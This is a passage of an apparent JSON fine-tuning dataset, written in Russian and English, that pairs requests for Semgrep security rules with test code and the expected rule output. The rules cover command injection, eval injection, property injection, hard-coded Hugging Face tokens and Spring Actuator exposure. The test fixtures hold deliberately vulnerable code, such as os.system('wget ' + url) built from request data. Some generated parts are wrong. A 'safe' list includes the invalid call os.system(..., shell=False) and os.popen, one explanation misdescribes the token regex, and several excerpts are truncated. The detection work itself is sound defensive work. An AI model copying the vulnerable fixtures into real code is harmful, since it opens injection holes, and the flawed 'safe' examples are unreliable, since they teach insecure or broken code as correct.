и headers. Синки (sinks) определяются как присваивание значений объектам через квадратные скобки без явной защиты от инъекций. Правило ищет функции или методы Express.js, принимающие запрос ($REQ) и ответ ($RES), а также проверяет наличие пользовательского ввода в параметрах запроса, тела, куках, заголовках и параметрах маршрута. Паттерны источников и синков комбинируются с операторами ИЛИ и НЕ для точного определения опасных ситуаций.\n\n# Ключевые элементы:\n- ID: remote-property-injection\n- Язык: javascript \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "remote-property-injection",
      "language": "javascript",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: dangerous-testcapi-run-in-subinterp\nОписание уязвимости: Found user controlled content in `run_in_subinterp`. This is dangerous because it allows a malicious actor to run arbitrary Python code.\nCWE: CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\nТип анализа: taint\nЯзык: python\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: python\n- Тип анализа: taint\n- CWE: CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: dangerous-testcapi-run-in-subinterp.py\nimport _testcapi\nfrom test import support\n\nimport flask\n\napp = flask.Flask(__name__)\n\n\n@app.route(\"/route_param/<route_param>\")\ndef route_param(route_param):\n\n    # ruleid: dangerous-testcapi-run-in-subinterp\n    support.run_in_subinterp(route_param)\n\n    return \"oops!\"\n\n\n# Flask true negatives\n@app.route(\"/route_param/<route_param>\")\ndef route_param2(route_param):\n\n    # ok: dangerous-testcapi-run-in-subinterp\n    _testcapi.run_in_subinterp(\"print('Hello world')\")\n\n    return \"ok!\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: dangerous-testcapi-run-in-subinterp.py\nimport _testcapi\n...\n@app.route(\"/route_param/<route_param>\")\ndef route_param(route_param):\n    # ruleid: dangerous-testcapi-run-in-subinterp\n    suppor\n• // File: another_dangerous.py\nimport _testcapi\n...\ndef some_function(user_input):\n    # ruleid: dangerous-testcapi-run-in-subinterp\n    _testcapi.run_in_subinterp(user_input)\n\nБезопасные паттерны:  \n• // File: safe-code.py\nimport _testcapi\n...\n_testcapi.run_in_subinterp(\"print('Hello world')\");\n• // File: secure-code.py\nimport _testcapi\n...\ndef some_function():\n    _testcapi.run_in_subinterp(\"some_safe_code\");\n\nЛегенда аннотаций:\n- // ruleid:dangerous-testcapi-run-in-subinterp: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:dangerous-testcapi-run-in-subinterp: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: dangerous-testcapi-run-in-subinterp\n  mode: taint\n  options:\n    symbolic_propagation: true\n  pattern-sources:\n  - patterns:\n    - pattern-either:\n      - patterns:\n        - pattern-either:\n          - pattern: flask.request.form.get(...)\n          - pattern: flask.request.form[...]\n          - pattern: flask.request.args.get(...)\n          - pattern: flask.request.args[...]\n          - pattern: flask.request.values.get(...)\n          - pattern: flask.request.values[...]\n          - pattern: flask.request.cookies.get(...)\n          - pattern: flask.request.cookies[...]\n          - pattern: flask.request.stream\n          - pattern: flask.request.headers.get(...)\n          - pattern: flask.request.headers[...]\n          - pattern: flask.request.data\n          - pattern: flask.request.full_path\n          - pattern: flask.request.url\n          - pattern: flask.request.json\n          - pattern: flask.request.get_json()\n          - pattern: flask.request.view_args.get(...)\n          - pattern: flask.request.view_args[...]\n          - patterns:\n            - pattern-inside: |\n                @$APP.route(...)\n                def $FUNC(..., $ROUTEVAR, ...):\n                  ...\n            - focus-metavariable: $ROUTEVAR\n      - patterns:\n        - pattern-inside: |\n            def $FUNC(request, ...):\n              ...\n        - pattern-either:\n          - pattern: request.$PROPERTY.get(...)\n          - pattern: request.$PROPERTY[...]\n      - patterns:\n        - pattern-either:\n          - pattern-inside: |\n              @rest_framework.decorators.api_view(...)\n              def $FUNC($REQ, ...):\n                ...\n          - patterns:\n            - pattern-either:\n              - pattern-inside: |\n                  class $VIEW(..., rest_framework.views.APIView, ...):\n                    ...\n              - pattern-inside: |\n                  class $VIEW(..., rest_framework.generics.GenericAPIView, ...):\n                    ...                              \n            - pattern-inside: |\n                def $METHOD(self, $REQ, ...):\n                  ...\n            - metavariable-regex:\n                metavariable: $METHOD\n                regex: (get|post|put|patch|delete|head)\n        - pattern-either:\n          - pattern: $REQ.POST.get(...)\n          - pattern: $REQ.POST[...]\n          - pattern: $REQ.FILES.get(...)\n          - pattern: $REQ.FILES[...]\n          - pattern: $REQ.DATA.get(...)\n          - pattern: $REQ.DATA[...]\n          - pattern: $REQ.QUERY_PARAMS.get(...)\n          - pattern: $REQ.QUERY_PARAMS[...]\n          - pattern: $REQ.data.get(...)\n          - pattern: $REQ.data[...]\n          - pattern: $REQ.query_params.get(...)\n          - pattern: $REQ.query_params[...]\n          - pattern: $REQ.content_type\n          - pattern: $REQ.content_type\n          - pattern: $REQ.stream\n          - pattern: $REQ.stream\n      - patterns:\n        - pattern-either:\n          - pattern-inside: |\n              class $SERVER(..., http.server.BaseHTTPRequestHandler, ...):\n                ...\n          - pattern-inside: |\n              class $SERVER(..., http.server.StreamRequestHandler, ...):\n                ...\n          - pattern-inside: |\n              class $SERVER(..., http.server.DatagramRequestHandler, ...):\n                ...\n        - pattern-either:\n          - pattern: self.requestline\n          - pattern: self.path\n          - pattern: self.headers[...]\n          - pattern: self.headers.get(...)\n          - pattern: self.rfile\n      - patterns:\n        - pattern-inside: |\n            @pyramid.view.view_config( ... )\n            def $VIEW($REQ):\n              ...\n        - pattern: $REQ.$ANYTHING\n        - pattern-not: $REQ.dbsession\n  pattern-sinks:\n  - patterns:\n    - pattern-either:\n      - pattern: |\n          _testcapi.run_in_subinterp($PAYLOAD, ...)\n      - pattern: |\n          test.support.run_in_subinterp($PAYLOAD, ...)\n    - focus-metavariable: $PAYLOAD\n    - pattern-not: |\n        _testcapi.run_in_subinterp(\"...\", ...)\n    - pattern-not: |\n        test.support.run_in_subinterp(\"...\", ...)\n  message: >-\n    Found user controlled content in `run_in_subinterp`.\n    This is dangerous because it allows a malicious actor to run arbitrary Python code.\n  metadata:\n    cwe:\n    - \"CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\"\n    owasp:\n    - A03:2021 - Injection\n    references:\n    - https://semgrep.dev/docs/cheat-sheets/python-command-injection/\n    category: security\n    technology:\n    - python\n    confidence: MEDIUM\n    subcategory:\n    - vuln\n    likelihood: HIGH\n    impact: HIGH\n  severity: WARNING\n  languages:\n  - python\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования функции run_in_subinterp из модуля _testcapi или test.support с потенциально контролируемым пользователем содержимым. Источники (sources) определяют различные места в коде, откуда может поступать пользовательский ввод, включая запросы HTTP, аргументы маршрутов, данные форм и другие источники ввода. Синки (sinks) идентифицируют конкретные вызовы функций run_in_subinterp, которые могут привести к выполнению произвольного Python-кода. Правило использует метапеременные ($VAR) и шаблоны сопоставления для обнаружения опасных примеров.\n\n# Ключевые элементы:\n- ID: dangerous-testcapi-run-in-subinterp\n- Язык: python \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "dangerous-testcapi-run-in-subinterp",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения unnecessary-parent-operator\nОписание уязвимости: Unnecessary parent operator. Remove one to fix.\nCWE: \nТип анализа: search\nЯзык: yaml",
    "input": "Требования:\n- Язык: yaml\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: unnecessary-parent.test.yaml\nrules:\n  - id: unchecked-subprocess-call1\n    # ruleid: unnecessary-parent-operator\n    patterns:\n      - pattern-either:\n          - pattern: subprocess.call1(...)\n          - pattern: subprocess.call2(...)\n    message: test\n    severity: WARNING\n    fix: subprocess.check_call(...)\n  - id: unchecked-subprocess-call2\n    # ok: unnecessary-parent-operator\n    patterns:\n      - pattern-either:\n          - pattern: subprocess.call1(...)\n          - pattern: subprocess.call2(...)\n      - pattern: subprocess.call3(...)\n    message: test\n    severity: WARNING\n    fix: subprocess.check_call(...)\n  - id: unchecked-subprocess-call3\n    # ruleid: unnecessary-parent-operator\n    pattern-either:\n      - patterns:\n          - pattern: subprocess.call1(...)\n          - pattern: subprocess.call2(...)\n    message: test\n    severity: WARNING\n    fix: subprocess.check_call(...)\n  - id: unchecked-subprocess-call4\n    # ok: unnecessary-parent-operator\n    pattern-either:\n      - patterns:\n          - pattern: subprocess.call1(...)\n          - pattern: subprocess.call2(...)\n      - pattern: subprocess.call3(...)\n    message: test\n    severity: WARNING\n    fix: subprocess.check_call(...)\n  - id: unchecked-subprocess-call5\n    # ruleid: unnecessary-parent-operator\n    pattern-either:\n      - pattern: subprocess.call1(...)\n    message: test\n    severity: WARNING\n    fix: subprocess.check_call(...)\n  - id: unchecked-subprocess-call6\n    # ok: unnecessary-parent-operator\n    pattern-either:\n      - pattern: subprocess.call1(...)\n      - pattern: subprocess.call2(...)\n    message: test\n    severity: WARNING\n    fix: subprocess.check_call(...)\n  - id: unchecked-subprocess-call7\n    # ruleid: unnecessary-parent-operator\n    patterns:\n      - pattern: subprocess.call1(...)\n    message: test\n    severity: WARNING\n    fix: subprocess.check_call(...)\n  - id: unchecked-subprocess-call8\n    # ok: unnecessary-parent-operator\n    patterns:\n      - pattern: subproce  # Ограничиваем длину\n\nОпасные паттерны:\n• pattern-either:\n  - pattern-either:\n      - pattern: subprocess.call1(...)\n      - pattern: subprocess.call2(...)\n• patterns:\n  - pattern: subprocess.call1(...)\n  - pattern-either:\n      - pattern: subprocess.call2(...)\n• pattern-either:\n  - patterns:\n      - pattern: subprocess.call1(...)\n      - pattern: subprocess.call2(...)\n\nБезопасные паттерны:  \n• patterns:\n  - pattern: subprocess.call1(...)\n  - pattern: subprocess.call2(...)\n• pattern-either:\n  - pattern: subprocess.call1(...)\n  - pattern: subprocess.call2(...)\n  - pattern: subprocess.call3(...)\n• patterns:\n  - pattern: subprocess.call1(...)\n  - pattern-either:\n      - pattern: subprocess.call2(...)\n      - pattern: subprocess.call3(...)\n\nЛегенда аннотаций:\n- // ruleid:unnecessary-parent-operator: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:unnecessary-parent-operator: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: unnecessary-parent-operator\n  message: >-\n    Unnecessary parent operator. Remove one to fix.\n  severity: WARNING\n  metadata:\n    category: best-practice\n    technology:\n    - semgrep\n  languages: [yaml]\n  patterns:\n  - pattern-inside: 'rules: [..., $RULE, ...]'\n  - pattern-either:\n    - patterns:\n      - pattern: |\n          pattern-either:\n          - $THING1\n          - ...\n      - pattern-not: |\n          pattern-either:\n          - $THING1\n          - $THING2\n          - ...\n    - patterns:\n      - pattern: |\n          patterns:\n          - $THING1\n          - ...\n      - pattern-not: |\n          patterns:\n          - $THING1\n          - $THING2\n          - ...\n    - pattern: |\n        pattern-either:\n        - ...\n        - pattern-either:\n          - ...\n\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска избыточных операторов 'pattern-either' внутри структуры 'patterns'. В опасных примерах оператор 'pattern-either' используется дважды подряд или вложенно, что является ненужным и может привести к избыточности в шаблонах. Безопасные примеры показывают корректное использование оператора 'pattern-either', где он применяется только один раз или отсутствует лишняя вложенность.\n\n# Ключевые элементы:\n- ID: unnecessary-parent-operator\n- Язык: yaml \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "unnecessary-parent-operator",
      "language": "yaml",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения command-injection-os-system\nОписание уязвимости: Request data detected in os.system. This could be vulnerable to a command injection and should be avoided. If this must be done, use the 'subprocess' module instead and pass the arguments as a list. See https://owasp.org/www-community/attacks/Command_Injection for more information.\nCWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: command-injection-os-system.py\nimport os\n\ndef danger(request):\n    # ruleid: command-injection-os-system\n    url = request.GET['url']\n    os.system('wget ' + url)\n\ndef danger2(request):\n    # ruleid: command-injection-os-system\n    image = request.POST['image']\n    os.system(\"./face-recognize %s --N 24\" % image)\n\ndef danger3(request):\n    # ruleid: command-injection-os-system\n    url = request.GET['url']\n    os.system(\"nslookup \" + url)\n\ndef ok(request):\n    # ok: command-injection-os-system\n    url = request.GET['url']\n    os.system(\"echo 'hello'\")  # Ограничиваем длину\n\nОпасные паттерны:\n• os.system('wget ' + url)\n• os.system('./face-recognize %s --N 24' % image)\n• os.system(\"nslookup \" + url)\n\nБезопасные паттерны:  \n• os.system('echo 'hello')\n• os.system('ls -l', shell=False)\n• os.popen('command', 'r').read()\n\nЛегенда аннотаций:\n- // ruleid:command-injection-os-system: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:command-injection-os-system: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: command-injection-os-system\n  message: Request data detected in os.system. This could be vulnerable to a command injection and should\n    be avoided. If this must be done, use the 'subprocess' module instead and pass the arguments as a\n    list. See https://owasp.org/www-community/attacks/Command_Injection for more information.\n  metadata:\n    cwe:\n    - \"CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\"\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    references:\n    - https://owasp.org/www-community/attacks/Command_Injection\n    category: security\n    technology:\n    - django\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: HIGH\n    confidence: MEDIUM\n  languages: [python]\n  severity: ERROR\n  patterns:\n  - pattern-inside: |\n      def $FUNC(...):\n        ...\n  - pattern-either:\n    - pattern: os.system(..., request.$W.get(...), ...)\n    - pattern: os.system(..., $S.format(..., request.$W.get(...), ...), ...)\n    - pattern: os.system(..., $S % request.$W.get(...), ...)\n    - pattern: os.system(..., f\"...{request.$W.get(...)}...\", ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        os.system(..., $DATA, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = $DATA\n        ...\n        os.system(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        os.system(..., $STR.format(..., $DATA, ...), ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = $STR.format(..., $DATA, ...)\n        ...\n        os.system(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        os.system(..., $STR % $DATA, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = $STR % $DATA\n        ...\n        os.system(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        os.system(..., f\"...{$DATA}...\", ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = f\"...{$DATA}...\"\n        ...\n        os.system(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        os.system(..., $STR + $DATA, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = $STR + $DATA\n        ...\n        os.system(..., $INTERM, ...)\n    - pattern: $A = os.system(..., request.$W.get(...), ...)\n    - pattern: $A = os.system(..., $S.format(..., request.$W.get(...), ...), ...)\n    - pattern: $A = os.system(..., $S % request.$W.get(...), ...)\n    - pattern: $A = os.system(..., f\"...{request.$W.get(...)}...\", ...)\n    - pattern: return os.system(..., request.$W.get(...), ...)\n    - pattern: return os.system(..., $S.format(..., request.$W.get(...), ...), ...)\n    - pattern: return os.system(..., $S % request.$W.get(...), ...)\n    - pattern: return os.system(..., f\"...{request.$W.get(...)}...\", ...)\n    - pattern: os.system(..., request.$W(...), ...)\n    - pattern: os.system(..., $S.format(..., request.$W(...), ...), ...)\n    - pattern: os.system(..., $S % request.$W(...), ...)\n    - pattern: os.system(..., f\"...{request.$W(...)}...\", ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        os.system(..., $DATA, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = $DATA\n        ...\n        os.system(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        os.system(..., $STR.format(..., $DATA, ...), ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = $STR.format(..., $DATA, ...)\n        ...\n        os.system(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        os.system(..., $STR % $DATA, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = $STR % $DATA\n        ...\n        os.system(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        os.system(..., f\"...{$DATA}...\", ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = f\"...{$DATA}...\"\n        ...\n        os.system(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        os.system(..., $STR + $DATA, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = $STR + $DATA\n        ...\n        os.system(..., $INTERM, ...)\n    - pattern: $A = os.system(..., request.$W(...), ...)\n    - pattern: $A = os.system(..., $S.format(..., request.$W(...), ...), ...)\n    - pattern: $A = os.system(..., $S % request.$W(...), ...)\n    - pattern: $A = os.system(..., f\"...{request.$W(...)}...\", ...)\n    - pattern: return os.system(..., request.$W(...), ...)\n    - pattern: return os.system(..., $S.format(..., request.$W(...), ...), ...)\n    - pattern: return os.system(..., $S % request.$W(...), ...)\n    - pattern: return os.system(..., f\"...{request.$W(...)}...\", ...)\n    - pattern: os.system(..., request.$W[...], ...)\n    - pattern: os.system(..., $S.format(..., request.$W[...], ...), ...)\n    - pattern: os.system(..., $S % request.$W[...], ...)\n    - pattern: os.system(..., f\"...{request.$W[...]}...\", ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        os.system(..., $DATA, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = $DATA\n        ...\n        os.system(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        os.system(..., $STR.format(..., $DATA, ...), ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = $STR.format(..., $DATA, ...)\n        ...\n        os.system(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        os.system(..., $STR % $DATA, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = $STR % $DATA\n        ...\n        os.system(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        os.system(..., f\"...{$DATA}...\", ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = f\"...{$DATA}...\"\n        ...\n        os.system(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        os.system(..., $STR + $DATA, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = $STR + $DATA\n        ...\n        os.system(..., $INTERM, ...)\n    - pattern: $A = os.system(..., request.$W[...], ...)\n    - pattern: $A = os.system(..., $S.format(..., request.$W[...], ...), ...)\n    - pattern: $A = os.system(..., $S % request.$W[...], ...)\n    - pattern: $A = os.system(..., f\"...{request.$W[...]}...\", ...)\n    - pattern: return os.system(..., request.$W[...], ...)\n    - pattern: return os.system(..., $S.format(..., request.$W[...], ...), ...)\n    - pattern: return os.system(..., $S % request.$W[...], ...)\n    - pattern: return os.system(..., f\"...{request.$W[...]}...\", ...)\n    - pattern: os.system(..., request.$W, ...)\n    - pattern: os.system(..., $S.format(..., request.$W, ...), ...)\n    - pattern: os.system(..., $S % request.$W, ...)\n    - pattern: os.system(..., f\"...{request.$W}...\", ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        os.system(..., $DATA, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = $DATA\n        ...\n        os.system(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        os.system(..., $STR.format(..., $DATA, ...), ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = $STR.format(..., $DATA, ...)\n        ...\n        os.system(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        os.system(..., $STR % $DATA, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = $STR % $DATA\n        ...\n        os.system(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        os.system(..., f\"...{$DATA}...\", ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = f\"...{$DATA}...\"\n        ...\n        os.system(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        os.system(..., $STR + $DATA, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = $STR + $DATA\n        ...\n        os.system(..., $INTERM, ...)\n    - pattern: $A = os.system(..., request.$W, ...)\n    - pattern: $A = os.system(..., $S.format(..., request.$W, ...), ...)\n    - pattern: $A = os.system(..., $S % request.$W, ...)\n    - pattern: $A = os.system(..., f\"...{request.$W}...\", ...)\n    - pattern: return os.system(..., request.$W, ...)\n    - pattern: return os.system(..., $S.format(..., request.$W, ...), ...)\n    - pattern: return os.system(..., $S % request.$W, ...)\n    - pattern: return os.system(..., f\"...{request.$W}...\", ...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования функции os.system() в Python-коде, где аргумент передается напрямую из запроса HTTP (request). Это может привести к командной инъекции, так как пользовательский ввод не должным образом экранируется или фильтруется перед использованием в системе(). Правило использует шаблонный подход для сопоставления различных способов передачи данных из запроса в функцию system(), включая форматирование строк ($S.format()), интерполяцию строк (%), форматирование f-строк и конкатенацию строк (+). Любая из этих конструкций потенциально опасна, если данные берутся непосредственно из небезопасного источника, такого как запрос HTTP.\n\n# Ключевые элементы:\n- ID: command-injection-os-system\n- Язык: python \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "command-injection-os-system",
      "language": "python",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения huggingface-access-token\nОписание уязвимости: A gitleaks huggingface-access-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: huggingface-access-token.txt\n\n// ruleid: huggingface-access-token\nhuggingface-cli login --token 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  # Ограничиваем длину\n\nОпасные паттерны:\n• // ruleid: huggingface-access-token\nhuggingface-cli login --token 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\n• // ruleid: huggingface-access-token\nconst accessToken = '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';\n• // ruleid: huggingface-access-token\nlet token = \"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\";\n\nБезопасные паттерны:  \n• // safe: no hardcoded token\nhuggingface-cli login --token ${process.env.ACCESS_TOKEN}\n• // safe: using environment variable\nconst accessToken = process.env.HUGGINGFACE_ACCESS_TOKEN\n• // safe: using secure vault\nlet token = getSecureCredential('HUGGINGFACE_ACCESS_TOKEN');\n\nЛегенда аннотаций:\n- // ruleid:huggingface-access-token: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:huggingface-access-token: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: huggingface-access-token\n  message: A gitleaks huggingface-access-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (?:^|[\\\\'\"` >=:])(hf_[a-zA-Z]{34})(?:$|[\\\\'\"` <])\n\n\n# Логика правила:\nЭто правило использует регулярное выражение для поиска жестко закодированных токенов доступа Hugging Face в исходном коде. Оно ищет строку, начинающуюся с 'hf_' за которой следует 34 символа в нижнем регистре, которые могут быть частью жестко закодированного токена доступа. Правило применяет оператор границы слова (^ или $) и специальные символы ('`\"=:>') для ограничения контекста поиска, чтобы исключить ложные срабатывания.\n\n# Ключевые элементы:\n- ID: huggingface-access-token\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "huggingface-access-token",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: spring-actuator-fully-enabled\nОписание уязвимости: Spring Boot Actuator is fully enabled. This exposes sensitive endpoints such as /actuator/env, /actuator/logfile, /actuator/heapdump and others. Unless you have Spring Security enabled or another means to protect these endpoints, this functionality is available without authentication, causing a significant security risk.\nCWE: CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\nТип анализа: search\nЯзык: generic",
    "input": "Требования:\n- Язык: generic\n- Тип анализа: search\n- CWE: CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: spring-actuator-fully-enabled.properties\n# ok: spring-actuator-fully-enabled\nfoo=bar\n# ruleid: spring-actuator-fully-enabled\nmanagement.endpoints.web.exposure.include=*  # Ограничиваем длину\n\nОпасные паттерны:\n• management.endpoints.web.exposure.include=*\n• management.endpoints.web.exposure.include=/actuator/**\n\nБезопасные паттерны:  \n• management.endpoints.web.exposure.include=/actuator/info\n• management.endpoints.web.exposure.include=/actuator/health\n\nЛегенда аннотаций:\n- // ruleid:spring-actuator-fully-enabled: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:spring-actuator-fully-enabled: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: spring-actuator-fully-enabled\n  pattern: management.endpoints.web.exposure.include=*\n  message: >-\n    Spring Boot Actuator is fully enabled. This exposes sensitive endpoints such as /actuator/env, /actuator/logfile,\n    /actuator/heapdump and others.\n    Unless you have Spring Security enabled or another means to protect these endpoints, this functionality\n    is available without authentication, causing a significant security risk.\n  severity: ERROR\n  languages: [generic]\n  paths:\n    include:\n    - '*properties'\n  metadata:\n    cwe:\n    - 'CWE-200: Exposure of Sensitive Information to an Unauthorized Actor'\n    owasp:\n    - A01:2021 - Broken Access Control\n    references:\n    - https://docs.spring.io/spring-boot/docs/current/reference/html/production-ready-features.html#production-ready-endpoints-exposing-endpoints\n    - https://medium.com/walmartglobaltech/perils-of-spring-boot-actuators-misconfiguration-185c43a0f785\n    - https://blog.maass.xyz/spring-actuator-security-part-1-stealing-secrets-using-spring-actuators\n    category: security\n    technology:\n    - spring\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: HIGH\n    confidence: MEDIUM\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска конфигурации Spring Boot Actuator, которая полностью включена ('management.endpoints.web.exposure.include=*'). Такая конфигурация открывает чувствительные конечные точки, такие как /actuator/env, /actuator/logfile, /actuator/heapdump и другие, без необходимости аутентификации, что представляет значительную угрозу безопасности.\n\n# Ключевые элементы:\n- ID: spring-actuator-fully-enabled\n- Язык: generic \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "spring-actuator-fully-enabled",
      "language": "generic",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения empty-with-boolean-expression\nОписание уязвимости: Calling `empty` on a boolean expression may be an indication that a parenthesis is misplaced.\nCWE: \nТип анализа: search\nЯзык: php",
